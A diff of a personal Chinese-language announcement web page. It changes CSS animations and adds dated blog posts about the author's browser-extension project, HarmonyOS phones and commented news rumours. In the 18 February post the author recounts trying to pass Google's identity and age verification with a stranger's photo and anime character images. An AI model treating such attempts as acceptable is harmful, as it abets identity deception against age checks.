@@ -34,29 +34,6 @@
             overflow-y: auto;
         }
 
-        .snowflake {
-            position: fixed;
-            top: -20px;
-            color: gold;
-            font-size: 24px;
-            user-select: none;
-            pointer-events: none;
-            animation: fall linear forwards;
-        }
-
-        @keyframes fall {
-            to {
-                transform: translateY(105vh) rotate(360deg);
-            }
-        }
-
-
-        @keyframes gradientMove {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
         @keyframes ULTRA {
             0% { opacity: 0; font-size: 53px;}
             50% { opacity: 0.5; font-size: 52px;}
@@ -93,13 +70,30 @@
             justify-content: center;
             align-items: center;
             animation: kuangjia 0.5s steps(150) 1;
-            position: relative;
-            z-index: 10;
-            border: 3px solid rgba(0, 174, 144, 0);
-            box-sizing: border-box;
+        }
+
+        .xibao:hover {
+            animation: xibaomax 0.25s ease-in-out 1;
+            width: 100%;
+            height: 900px; 
+            margin-top: -2%;
+            margin-bottom: -2%;
+            padding: 100px 0;
+            border-radius: 0px;
+            background: rgba(255, 0, 0, 1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        @keyframes xibaomax {
+            0% { width: 75%; height: 400px; margin-top: 50px; margin-bottom: 50px; }
+            100% { width: 100%; height:990px; margin-top: -2%; margin-bottom: -2%; }
         }
 
         .xibao {
+            animation: xibaoback 2s ease-in-out 1;
             width: 75%;
             height:400px; 
             margin: 50px auto;
@@ -110,15 +104,21 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            animation: kuangjia 0.5s steps(150) 1;
+        }
+
+        @keyframes xibaoback {
+            0% { width: 100%; height:990px; margin-top: -2%; margin-bottom: -2%; }
+            80% { width: 100%; height:990px; margin-top: -2%; margin-bottom: -2%; }
+            100% { width: 75%; height:400px; margin-top: 50px; margin-bottom: 50px; }
         }
 
         .xibao .xibaozi {
-            font-family: 'LiSu', cursive, 'STXingkai', serif;
+            font-family: 'LiSu', 'cursive', 'STXingkai', serif;
             font-size: 50px;
-            text-align: center;
+            text-align: center; 
+            margin-bottom: 50px;
             color: #ffd700;
-            text-shadow: 
+            text-shadow:
                 0 0 10px #ff0000,
                 0 0 20px #ff0000,
                 0 0 30px #ff0000,
@@ -128,8 +128,18 @@
             animation: titlePulse 1s infinite alternate;
         }
 
-        .ultra {
+        @keyframes titlePulse {
+            0% { text-shadow: none; }
+            100% { text-shadow: 0 0 10px #ffd700; }
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+            0% { background-position: 0 0; }
+            100% { background-position: 100% 100%; }
+        }
 
+        .ultra {
             display: block;
             text-align: center;
             font-family: serif, sans-serif;
@@ -141,14 +151,13 @@
         }
 
         .pro {
-            display: block;
+            display: inline-block;
             text-align: center;
             font-family: serif, sans-serif;
             font-size: 22px;
             color: #000000;
             padding: 10px 10px;
             animation: PRO 0.5s steps(150) 1;
-            white-space: nowrap;
         }
 
         h1 {
@@ -171,9 +180,9 @@
             color : #666;
             font-size: 10px;
             margin-top: 20px;
-
         }
-        .zhengwen-container {
+
+        .zhengwen-container { 
             width: 75%;
             margin: 0 auto 50px;
             display: flex; 
@@ -181,7 +190,7 @@
             gap: 20px;
         }
 
-        .zhengwen {
+        .zhengwen { 
             background: rgba(255, 255, 255, 0.115);
             border: 2px solid #000000;
             backdrop-filter: blur(10px);
@@ -189,8 +198,6 @@
             padding: 30px; 
             text-align: left;
             animation: kuangjia 0.5s steps(150) 1;
-            position: relative;
-            z-index: 30;
         }
 
         .zhengwen h1 {
@@ -214,11 +221,11 @@
         }
 
         .zhengwen h3 {
-            font-size: 24px;
+            font-size: 26px;
             color: #333;
             text-indent: 2em;
-            margin-top: -5px;
-            margin-bottom: -2px;
+            margin-top: 8px;
+            margin-bottom: 8px;
             text-align: left;
             font-family: serif, sans-serif;
             font-weight: normal;
@@ -249,31 +256,19 @@
             font-size: 24px;
             color: #333;
             text-indent: 2em;
-            line-height: 1.6;
+            line-height: 1.5;
             margin-bottom: 15px;
             text-align: left;
             font-family: serif, sans-serif;
             font-weight: normal;
         }
 
-        .zhengwen ol li {
+        .zhengwen li {
             font-size: 24px;
             color: #333;
             text-indent: 0em;
-            line-height: 1;
+            line-height: 1.25;
             list-style-type: decimal;
-            margin-left: 80px;
-            margin-bottom: 15px;
-            text-align: left;
-            font-family: serif, sans-serif;
-        }
-
-        .zhengwen ul li {
-            font-size: 24px;
-            color: #333;
-            text-indent: 0em;
-            line-height: 1;
-            list-style-type: disc;
             margin-left: 80px;
             margin-bottom: 15px;
             text-align: left;
@@ -401,108 +396,12 @@
             margin: 0;
         }
 
-        .kaiguan-container {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            z-index: 1000;
-            background: rgba(255, 255, 255, 0);
-            backdrop-filter: blur(0px);
-            padding: 8px;
-            border-radius: 28px;
-            box-shadow: none;
-            opacity: 0;
-        }
-
-        .kaiguan {
-            position: relative;
-            width: 52px;
-            height: 28px;
-            background: rgba(189, 189, 189, 0);
-            backdrop-filter: blur(0px);
-            border-radius: 14px;
-            cursor: pointer;
-            transition: background 0.2s ease;
-            opacity: 0;
-        }
-
-        .kaiguan.active {
-            background: rgba(0, 174, 0, 0);
-        }
-
-        .kaiguan-thumb {
-            position: absolute;
-            top: 2px;
-            left: 2px;
-            width: 24px;
-            height: 24px;
-            background: rgba(255, 255, 255, 0);
-            backdrop-filter: blur(0px);
-            border-radius: 50%;
-            box-shadow: none;
-            transition: transform 0.2s ease;
-            opacity: 0;
-        }
-
-        .kaiguan.active .kaiguan-thumb {
-            transform: translateX(24px);
-        }
-
-
-
-        .poison-mushroom {
-            position: fixed;
-            z-index: 9999;
-            font-size: 30px;
-            user-select: none;
-            pointer-events: none;
-            animation: mushroomFloat 2s ease-in-out infinite;
-        }
-
-        @keyframes mushroomFloat {
-            0%, 100% { transform: translateY(0) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(10deg); }
-        }
-
-        .ultimeta-emoji {
-            position: fixed;
-            z-index: 10;
-            user-select: none;
-            pointer-events: none;
-            font-size: 25px;
-        }
-
-        @keyframes infiniteFall {
-            0% {
-                transform: translateY(-100px) rotate(0deg);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(110vh) rotate(720deg);
-                opacity: 0.8;
-            }
-        }
-
-        body.ultimeta-active .kaiguan {
-            pointer-events: none;
-            opacity: 0.7;
-            background: rgba(255, 0, 0, 0.7) !important;
-        }
-
-        body.ultimeta-active .kaiguan .kaiguan-thumb {
-            background: rgba(255, 255, 255, 0.9) !important;
-        }
-
     </style>
 </head>
 <body>
-    <div class="kaiguan-container">
-        <div class="kaiguan" id="kaiguan">
-            <div class="kaiguan-thumb"></div>
-        </div>
+    <div class="xibao">
+        <div class="xibaozi" style="font-family: serif, sans-serif; font-weight: 900;">The part that out of control is now under control! </div>
+        <div class="xibaozi" style="font-family: serif, sans-serif; font-weight: 900;">1月31日至2月5日内容已全部同步完成！</div>
     </div>
     <div class="dakuang">
         <div class="ultra">ByRUDAN的公告</div>
@@ -510,50 +409,68 @@
     </div>
         <div class="decoration">不造谣，不信谣，不传谣。</div>
     <div class="zhengwen-container">
-        <duv class="zhengwen">
+        <div class="zhengwen">
+            <h1>2026年2月20日 星期五</h1>
+            <h2>开发相关</h2>
+            <h3>信息</h3>
+            <p>1月31日至2月5日内容已全部同步完成，往下滑就能查看了！不得不说，我以前写的东西是真的多，粘贴的累死我了。</p>
+            <p>The part that out of control is not under control, But I think the fire will be under control too! </p>
+            <p class="se">失控的部分已得到控制，但我想我的CTRL键将要着火了！（按下次数太多了）</p>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
+        </div>
+        <div class="zhengwen">
+            <h1>2026年2月18日 星期三</h1>
+            <h2>记录</h2>
+            <p>微信Windows版最近上线了一个语音输入，按一下CTRL（Control）和Windows徽标就可以输入，还是挺方便的。缺点也有，换虚拟桌面的快捷键和这个冲突了（不过可以自定义）。</p>
+            <p>今天尝试了一下Google实名认证以（有几率）使用Google AI Studio。毕竟我这脸一看就是没成年的，所以我想用一下网图。首先搞了一个印度人的人脸，结论：不行。这么一想，要不我换个角度试试看，然后就去试了一下丹恒、加拉赫、布洛尼亚、西露瓦、Archer、钟离、琴，结论：不行。</p>
+            <div class="h3s">关于鸿蒙</div>
+            <p>鸿蒙上确实有很多独家应用。比如快手笔这款软件，这款软件是我刚下的，他就是去使用鸿蒙原生的样式（这玩意儿应该叫ArkUI），虽然说动画傻快傻快的、配色也有点奇怪，但总体体验确实不错；还包括奇妙系列、扁担系列都有很多产品。</p>
+            <p>鸿蒙系统层面（仅限于系统层面）有安卓系统比拟不了的丝滑程度。如果你用的是苹果想要换安卓我还是劝你放弃：你不要听那些人吹牛逼说什么安卓系统很流畅，流畅和丝滑还是有明显区别的。我不确定用丝滑这个词恰不恰当，但是这种行云流水的、非常连贯的操作，说的通俗而不落俗套，只能叫 "It's something only HarmonyOS can do."</p>
+            <p>接下来，我将说几个我体验中比较致命的问题，如果我真的想要亲自体验或家中有人想要买鸿蒙系统的手机的可作参考。</p>
+            <ol>
+                <li>很多软件加载都很慢。不论是微信小程序，还是抖音、B站这种视频软件，使用起来总是莫名其妙的加载（尽管你的网络是正常的）。</li>
+                <li>功能缺失一定程度上还是存在的。原来我用高驰手表的时候，微信运动里是会有一个小尾巴的；我看别人使用华为手表，在微信运动里也是有小尾巴的；但我购入的这款华为手表是没有显示的。这是为什么呢？原因很简单，鸿蒙版微信还没有适配。还有比如B站的很多活动相关的功能、豆包很多直达创作相关的内容都还没有适配完全。</li>
+                <li>其实有很多没有适配的功能都是可有可无的，但是有一个更加严重的问题——很多软件给你一种很粗糙的感觉。我是从安卓系统（或者叫"兼容安卓应用程序的双框架鸿蒙操作系统"）换过来的，我感觉在使用一些软件（比如抖音、豆包）的时候，视频播放页面、软件使用界面都会有一种很生硬的感觉（很多软件都是有专门的开发框架的，比如抖音系是有一套完整的框架的，但是都会针对系统做专门的界面显示效果调优，而在鸿蒙系统上，我并没有见到调优）。</li>
+                <li>最后一个问题就是不要把卓易通想的那么强大，虽然华为这套转译系统是真的牛逼，但再牛逼也绝对比不上原生软件。最明显的就是锁帧问题：基本上全部锁90（不要说什么以前用iPhone，60帧习惯了，突然从120降到90是绝对很难受的）。它的性能损耗其实也不小，如果想要靠它来玩游戏的话，建议只把它当做一个临时备用来玩。</li>
+            </ol>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
+        </div>
+        <div class="zhengwen">
             <h1>2026年2月16日 万恶的星期一</h1>
             <h2>正式通知：</h2>
             <p style="color:red">因新年影响，近日 ByRUDAN网页 的更新可能随时停止又随时继续，请谅解。</p>
             <h2>新年小惊喜</h2>
             <p>点击右下角开关即可看到新年新版样式！</p>
             <p>温馨提示：Never right-click the switch!!! </p>
-        </duv>
+        </div>
         <div class="zhengwen">
             <h1>2026年2月15日 知更鸟哥哥</h1>
-            <h2>重要信息</h2>
-            <p>因为目前评论统计的混乱和审查难度，暂时不会再新增评论内容。</p>
             <h2>开发相关</h2>
             <p class="h3s">信息</p>
             <p>即将迎来春节，我正在设计ByRUDAN网页的全新春节样式。上次做过一次类似春节的样式，被骂懵了，这次要重新做一个。目前还在找灵感（能抄到好看的自然是最好了）。</p>
             <p>为了营造清朗网络空间，ByRUDAN网页即将发布对于评论内容的审核机制（此前所上传的评论皆为精选内容，但无明确的精选规则）。</p>
             <p class="h3s">ByRUDAN网页审核规则</p>
-            <ol>
-                <li>严禁发表任何涉及个人隐私信息，以及包含言语粗俗、不文明等相关内容。</li>
-                <li>严禁发表一切未经证实的消息、纯粹虚构编造的内容，以及对他人进行辱骂诋毁的言论。</li>
-                <li>严禁发表严重违背常理、严重违背人类价值观的言论。</li>
-                <li>此外，还有一些发表建议：①不建议发表对党和国家不利的言论，造成的一切后果开花者不承担任何责任。</li>
-            </ol>
+            <li>严禁发表任何涉及个人隐私信息，以及包含言语粗俗、不文明等相关内容。</li>
+            <li>严禁发表一切未经证实的消息、纯粹虚构编造的内容，以及对他人进行辱骂诋毁的言论。</li>
+            <li>严禁发表严重违背常理、严重违背人类价值观的言论。</li>
+            <li>此外，还有一些发表建议：①不建议发表对党和国家不利的言论，造成的一切后果开花者不承担任何责任。</li>
             <h2>记录</h2>
             <p>做完了崩铁匹诺康尼的剧情。似乎花了特别久的时间。到底是什么人能一天肝完匹诺康尼全部剧情啊？</p>
             <h2>新闻评论</h2>
             <p class="h3s">热点新闻</p>
-            <ul>
-                <li>OpenAI 开放 GPT-5 全球免费无限使用：整合全模态交互能力，AI 产业竞争进入新阶段。（网传：OpenAI 所谓 “全球免费无限使用 GPT-5”，实际是30 天免费试用，到期后将恢复付费，且有使用额度限制。）全球吗？我说三个地方，中华人民共和国（即中国大陆），俄罗斯，朝鲜。我建议这样，开放一个看广告免费用的入口，用户看“30秒”的交互广告即可有机会免费试用。另外可以给普通版，用户的应用icon搞一个小裙子，想不看到小裙子就必须开plus。</li>
-                <li>豆包 2.0 推理效率 + 43%、Token 价降 90%（2.15 网传），Pro 版对标 GPT-5.2；Seedance 2.0 视频生成获马斯克点赞。价格下降好啊，但是这个pro版对标GPT是不是有点夸张了？生成视频确实挺不错的，但是限制有点多，不能像Sora那样生成金将军和普大帝接吻的视频。</li>
-                <li>中国驻新加坡使馆提醒远离赌博（一中国公民在新加坡赌博后跳楼身亡，使馆郑重提醒在新中国公民远离赌博）。新加坡，不赌博可以去嫖娼啊。*只是开玩笑，嫖娼在中华人民共和国（即中国大陆）是违法行为，我们应该共同抵制。</li>
-                <li>非洲 53 国对华零关税。我的评价就是，带不动国内经济。</li>
-                <li>近 50 国签署全球首个 AI 治理框架（禁止 AI 用于致命自主武器）。中国的民用人工智能技术很落后。</li>
-                <li>非官方通报请仔细甄别：多地 “春节补贴 / 消费券” 延迟发放（2 月 15 日）。那句话怎么说来着，大环境不好啊~</li>
-            </ul>
+            <li style="list-style-type: disc;">OpenAI 开放 GPT-5 全球免费无限使用：整合全模态交互能力，AI 产业竞争进入新阶段。（网传：OpenAI 所谓 “全球免费无限使用 GPT-5”，实际是30 天免费试用，到期后将恢复付费，且有使用额度限制。）全球吗？我说三个地方，中华人民共和国（即中国大陆），俄罗斯，朝鲜。我建议这样，开放一个看广告免费用的入口，用户看“30秒”的交互广告即可有机会免费试用。另外可以给普通版，用户的应用icon搞一个小裙子，想不看到小裙子就必须开plus。</li>
+            <li style="list-style-type: disc;">豆包 2.0 推理效率 + 43%、Token 价降 90%（2.15 网传），Pro 版对标 GPT-5.2；Seedance 2.0 视频生成获马斯克点赞。价格下降好啊，但是这个pro版对标GPT是不是有点夸张了？生成视频确实挺不错的，但是限制有点多，不能像Sora那样生成金将军和普大帝接吻的视频。</li>
+            <li style="list-style-type: disc;">中国驻新加坡使馆提醒远离赌博（一中国公民在新加坡赌博后跳楼身亡，使馆郑重提醒在新中国公民远离赌博）。新加坡，不赌博可以去嫖娼啊。*只是开玩笑，嫖娼在中华人民共和国（即中国大陆）是违法行为，我们应该共同抵制。</li>
+            <li style="list-style-type: disc;">非洲 53 国对华零关税。我的评价就是，带不动国内经济。</li>
+            <li style="list-style-type: disc;">近 50 国签署全球首个 AI 治理框架（禁止 AI 用于致命自主武器）。中国的民用人工智能技术很落后。</li>
+            <li style="list-style-type: disc;">非官方通报请仔细甄别：多地 “春节补贴 / 消费券” 延迟发放（2 月 15 日）。那句话怎么说来着，大环境不好啊~</li>
             <p class="h3s">投稿新闻</p>
-            <ul>
-                <li>Android17Beta1来了。目前还没有看到实机演示，但是这一次应该不会改动UI。相比于苹果的液态玻璃，我还是更喜欢谷歌的设计。</li>
-                <li>英伟达 H20/H100 国内 “隐形涨价”+ 供货收紧。哎呀呀，国内不是不让用吗？不是昇腾芯片遥遥领先吗？</li>
-                <li>苹果 iPhone 18 原型机 “无按键 + 全屏幕指纹”。“原型机”，人话就是第三方给果粉们画饼。</li>
-                <li>微软 遭巴西反垄断调查：强制捆绑 Edge。最支持巴西的一次。</li>
-                <li>某大厂 员工 “监控软件” 强制安装、截屏上传。违法的，肯定要彻查。</li>
-            </ul>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <li style="list-style-type: disc;">Android17Beta1来了。目前还没有看到实机演示，但是这一次应该不会改动UI。相比于苹果的液态玻璃，我还是更喜欢谷歌的设计。</li>
+            <li style="list-style-type: disc;">英伟达 H20/H100 国内 “隐形涨价”+ 供货收紧。哎呀呀，国内不是不让用吗？不是昇腾芯片遥遥领先吗？</li>
+            <li style="list-style-type: disc;">苹果 iPhone 18 原型机 “无按键 + 全屏幕指纹”。“原型机”，人话就是第三方给果粉们画饼。</li>
+            <li style="list-style-type: disc;">微软 遭巴西反垄断调查：强制捆绑 Edge。最支持巴西的一次。</li>
+            <li style="list-style-type: disc;">某大厂 员工 “监控软件” 强制安装、截屏上传。违法的，肯定要彻查。</li>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月14日 星期六</h1>
@@ -566,21 +483,17 @@
             <p>如果这个网页一直这么更新下去，内容会很多、很混乱。我打算按月分布，到了下一个月，我会把这个月的内容统一整理到页面最底部的按钮里，点击后可以跳转至对应日期。最大的困难还是JavaScript🕯</p>
             <h2>近日新闻</h2>
             <p class="h3s">热点新闻</p>
-            <ul>
-                <li>字节跳动豆包大模型 2.0/Seedance 2.0 发布，内部代号 “狂飙”。<br>豆包啊，送的钱不如千问。</li>
-                <li>小米开源 47 亿参数 VLA 机器人模型。<br>铁大还活着吗？</li>
-                <li>Anthropic 融资 300 亿美元。<br>国内用不了，欻欻封号。</li>
-                <li>马斯克披露月球 AI 卫星工厂蓝图。<br>实现了就是美国太坏了，没实现就是马斯克不行。</li>
-                <li>中央网信办整治 AI 虚假信息。<br>好就完了。</li>
-            </ul>
+            <li style="list-style-type: disc;">字节跳动豆包大模型 2.0/Seedance 2.0 发布，内部代号 “狂飙”。<br>豆包啊，送的钱不如千问。</li>
+            <li style="list-style-type: disc;">小米开源 47 亿参数 VLA 机器人模型。<br>铁大还活着吗？</li>
+            <li style="list-style-type: disc;">Anthropic 融资 300 亿美元。<br>国内用不了，欻欻封号。</li>
+            <li style="list-style-type: disc;">马斯克披露月球 AI 卫星工厂蓝图。<br>实现了就是美国太坏了，没实现就是马斯克不行。</li>
+            <li style="list-style-type: disc;">中央网信办整治 AI 虚假信息。<br>好就完了。</li>
             <p class="h3s">投稿新闻</p>
-            <ul>
-                <li>华为阔屏直板机立项。<br>感觉实用性不如折叠机。</li>
-                <li>iPhone 17e 会在2月19日悄咪咪发。<br>看这个网页的没有会买的吧？</li>
-                <li>小米 SU7 初代停产。<br>此前“新一代”出来了老一代还在生产？</li>
-            </ul>
+            <li style="list-style-type: disc;">华为阔屏直板机立项。<br>感觉实用性不如折叠机。</li>
+            <li style="list-style-type: disc;">iPhone 17e 会在2月19日悄咪咪发。<br>看这个网页的没有会买的吧？</li>
+            <li style="list-style-type: disc;">小米 SU7 初代停产。<br>此前“新一代”出来了老一代还在生产？</li>
             <p class="se">这是新款的新闻评论，如果有建议，我仍会不断优化。老的暂时不更新，等新版样式定好了再改老的。不断倾听用户声音，让OOOInterface变得更好。</p>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月13日 星期五</h1>
@@ -615,7 +528,7 @@
                 <p class="pb">本人始终如此认为，周先生对于 OOOInterface 的发展历程而言，乃是重中之重的关键人物。倘若没有周先生，便不会诞生 Material Interface Search Core，进而如今的 OOOInterface 也无从谈起。 </p>
                 <div class="line"></div>
             </div>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月12日 星期四</h1>
@@ -655,7 +568,7 @@
                 <p>这 文明CiviLang文明语言™️ 是啥啊？</p>
                 <p class="se">出于文明考虑，我将屏蔽脏话。CiviLang文明语言™️ 是文明用语公益组织的商标，该组织由学生组成，成立于2022年8月。</p>
             </div>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月11日 星期三</h1>
@@ -667,14 +580,12 @@
             <p>目前此版本旧内容尚未全部更新完毕，如有需求仍可前往老版网页查看（URL= <a href="https://byrudan.carrd.co/" target="_blank">旧版网页</a>） 。但后续定会将老版本内容同步至此。需要说明的是，老版本网页将不再进行更新，今后所有内容均以本页面为准。该网站的容量限制为1GB，也就是说我每日发布（含图片）一坤兆（2.5MB）的内容，足够持续发布一年！若想可持续发展，删除时间过久的图片即可。 </p>
             <p>说实话，InterfaceDesktop（OOOInterface桌面版）制作有不少困难，我只能不断测试。最近事情比较多，可能得稍微搁置一会儿了。但是，画饼这件事我还是能做的。</p>
             <p>InterfaceDesktop Package 0.2:02-AS07是目前的最新版本。目前版本已经具备的功能如下：</p>
-            <ol>
-                <li>OOOInterface5.1:24-RS42功能全方面兼容</li>
-                <li>全新自研右键菜单和搜索页面，降低操作门槛，提升界面易用性</li>
-                <li>全新自研高效引擎，减少内存占用，提升设备流畅性</li>
-            </ol>
+            <li>OOOInterface5.1:24-RS42功能全方面兼容</li>
+            <li>全新自研右键菜单和搜索页面，降低操作门槛，提升界面易用性</li>
+            <li>全新自研高效引擎，减少内存占用，提升设备流畅性</li>
             <p>详细解释下吧。所谓“右键菜单”，样式可以参考InterfaceExtensions（现在的版本）里“关于”页面（about.html）和“欢迎”页面（welc.html）的外观。搜索页面的修改，主要是顶部加了一行操作栏，样式可以参考macOS顶部的操作栏。“高效引擎”的实现方法是将用户数据单独存储（Bug还有亿点多），缓解JS屎山的压力（Extension版本做不了，傻逼Chrome有限制）。</p>
             <p>桌面版的制作起来有些地方限制会少一点，所以后面功能大概率会多不少。如果只是专门搜索内容的话，InterfaceDesktop将来一定是个不错的选择。</p>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月10日 星期二</h1>
@@ -684,7 +595,7 @@
             <p>今天是5.1发布的日子（昨天晚上睡着了，忘记发了）。非常高兴能看到5.1能拥有如此高的下载量。</p>
             <p>5.2功能建议可以投了，最近应该不太多Bug反馈的，会收集一些功能建议，用反馈页面的程序填写完成后发送到邮箱wyjcrtu@proton.me。不要用微信或者QQ，这样真的很乱，很多内容我会记录不到。</p>
             <p>5.2将正式推出InterfacePro，有需要的可以期待下。</p>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月9日 星期一</h1>
@@ -692,18 +603,14 @@
             <h3>信息</h3>
             <p>请期待：明天零点。</p>
             <p>OOOInterface将会有这样的产品线</p>
-            <ul>
-                <li>InterfaceExtensions</li>
-                <li>InterfaceDesktop</li>
-            </ul>
+            <li style="list-style-type: disc;">InterfaceExtensions</li>
+            <li style="list-style-type: disc;">InterfaceDesktop</li>
             <p>InterfacePro</p>
-            <ul>
-                <li>InterfacePro Tuner</li>
-                <li>InterfacePro Weaver</li>
-                <li>InterfacePro Refiner</li>
-            </ul>
+            <li style="list-style-type: disc;">InterfacePro Tuner</li>
+            <li style="list-style-type: disc;">InterfacePro Weaver</li>
+            <li style="list-style-type: disc;">InterfacePro Refiner</li>
 
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月8日 知更鸟哥哥</h1>
@@ -713,14 +620,12 @@
             <h2>记录</h2>
             <p>昨天和今天，我与OOOInterface的共创伙伴们进行了一些线下深度交流。在10日，InterfacePro邀约计划将正式开始。</p>
             <p>InterfacePro共分为三个版本。</p>
-            <ul>
-                <li>InterfacePro Tuner（粉色版本）：提供个性化定制服务。收费标准待定。</li>
-                <li>InterfacePro Weaver（蓝色版本）：提供新功能优先体验和测试服务。您需要发现和反馈Bug。</li>
-                <li>InterfacePro Refiner（紫色版本）：提供个性化定制服务和功能优先体验服务。收费标准待定。</li>
-            </ul>
+            <li style="list-style-type: disc;">InterfacePro Tuner（粉色版本）：提供个性化定制服务。收费标准待定。</li>
+            <li style="list-style-type: disc;">InterfacePro Weaver（蓝色版本）：提供新功能优先体验和测试服务。您需要发现和反馈Bug。</li>
+            <li style="list-style-type: disc;">InterfacePro Refiner（紫色版本）：提供个性化定制服务和功能优先体验服务。收费标准待定。</li>
             <p>在5.2版本中，将带来全新的InterfacePro。届时会发送账户注册表单，填写完成后将导出的RUD文件以指定格式发送给wyjcrtu@proton.me即可。</p>
             <p class="se">这目前只是一个计划，具体实施敬请期待。</p>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月7日 星期六</h1>
@@ -728,7 +633,7 @@
             <p>宝了个贝的，今天正在外面跟别人讨论OOOInterface何去何从呢，突然收到一条通知发现这网页还没更新，再一次懵逼了。</p>
             <p>38版本还是有比较多的问题的，不过已经修复了。今日晚些时候会发布39版本，需要的可以获取。为解决之前改了文件结构之后有的一些问题，再次修改了文件结构，这次应该是没有问题了。</p>
             <p>10号将发布正式版本。</p>
-            <div class="xiaozi">Style Version: 1.1.2<br>未使用人工智能</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>未使用人工智能</div>
         </div>
         <div class="zhengwen">
             <h1>2026年2月6日 星期五</h1>
@@ -742,220 +647,189 @@
             <p>美国人的技术卡我的脖子！美国微软公司邪恶的资本主义阻碍我们中国自主知识产权的浏览器启动页插件的技术进步！美国人凭借其掌握的技术，如同无情地卡住了我们的脖子！尤其是美国微软公司，这家具有代表性的资本主义企业，以其邪恶的行径，严重阻碍了我们中国在拥有自主知识产权的浏览器启动页插件技术领域的进步。他们凭借自身在技术和市场上的优势地位，不择手段地打压和限制我们中国相关技术的发展，试图维持自身的垄断地位，全然不顾公平竞争的市场原则，给我们中国自主知识产权的浏览器启动页插件技术的前行之路设置重重障碍。</p>
             <p>还有谷歌也是。美国人仗着手中握有的技术，毫不留情地卡住了我们的脖子！特别是美国微软公司，这个典型的邪恶资本主义企业，其种种恶劣行径，严重阻碍了我们中国在自主知识产权的浏览器启动页插件技术方面的进步。微软凭借自身在技术层面的领先以及在市场上占据的优势地位，采取各种不正当手段，肆意打压和限制我们中国相关技术的发展。他们这么做的目的，无非是妄图维持自身在该领域的垄断地位，完全无视公平竞争这一基本的市场原则，给中国自主知识产权的浏览器启动页插件技术的发展道路上设置了数不清的障碍。不仅如此，谷歌这家公司同样如此。谷歌也利用自身的技术与市场影响力，对中国自主知识产权的浏览器启动页插件技术的进步进行干扰，同样是为了巩固自身利益，全然不顾市场公平与行业健康发展，其行为同样给中国在该技术领域的探索与突破带来诸多阻碍。</p>
             <p class="se">*内容由AI生成，纯属娱乐，请仔细甄别（太懒了不想写新的了）。</p>
-            <div class="xiaozi">Style Version: 1.1.2<br>使用的AI：Doubao Seed 1.8</div>
+            <div class="xiaozi">Style Version: 1.1.3<br>使用的AI：Doubao Seed 1.8</div>
+        </div>
+        <div class="zhengwen">
+            <h1>2026年2月5日 星期四</h1>
+            <h2>开发相关</h2>
+            <h3>信息</h3>
+            <p>今天来聊聊5.2的计划吧。5.2，全称5.2:25，是一个新的大版本，在5.1正式版发布之后一周内就会开始制作。</p>
+            <p>有朋友给我反馈，说他无法用谷歌，那这个按钮放在上面就是浪费的，如果换成其他的搜索引擎那么效率会更高。因此我计划在5.2版本加入全新的自定义搜索引擎切换按钮功能。在描述新功能之前，让我们先回顾一下现在搜索引擎切换按钮现在已经具备的功能。现在的谷歌引擎按钮左键是进入搜索，右键是网页直达；而必应只有左键进入搜索，右键没有功能。而我想做的新功能的效果有两个。一个是可以在设置里自定义第一个引擎是什么（但因为只有谷歌有接口，所以网页直达大概率是只有谷歌才有了）。另一个则是右键第二个引擎可以切换更多的引擎（可以在设置里设置右键时可以切换的引擎以及出现顺序）。这个方案是我经过很长时间思考（这几天学校的体育课一直在想这个问题）得出来的。已经给几个有需求的朋友看了，目前看大家都挺喜欢这个设计。</p>
+            <p>实话实说，5.1在很多设计上都出现了“风格各异”的问题。因为要修改的地方有亿点多，所以这艰巨的任务还是要留到下一个版本。我这里目前记录了十几个要修改的地方，但如果大家还发现了问题，也欢迎反馈。</p>
+            <p>另外，最近我一直在尝试桌面版。我想在三月之前推出一个完整的桌面版（5.1），5.2的桌面版与5.2的正式版同时推出。如前文所说，在5.1中加入的很多功能和调整都是为全新的桌面版做准备的。在全新的OOOInterface5.2中，将有一个全新的InterfacePro计划推出。如果加入InterfacePro，您将可以享受专属定制的界面。</p>
+            <p>OOOInterfaceExpressive版本全版本更新时间表</p>
+            <li style="list-style-type: disc;">OOOInterfaceExpressive(5.0:23)2026/1/1</li>
+            <li style="list-style-type: disc;">OOOInterfaceExpressive(5.1:24)2026/2/10</li>
+            <li style="list-style-type: disc;">OOOInterfaceExpressive(5.2:25)2026/5/10</li>
+            <li style="list-style-type: disc;">OOOInterfaceExpressive(5.3:26)2026/8/10</li>
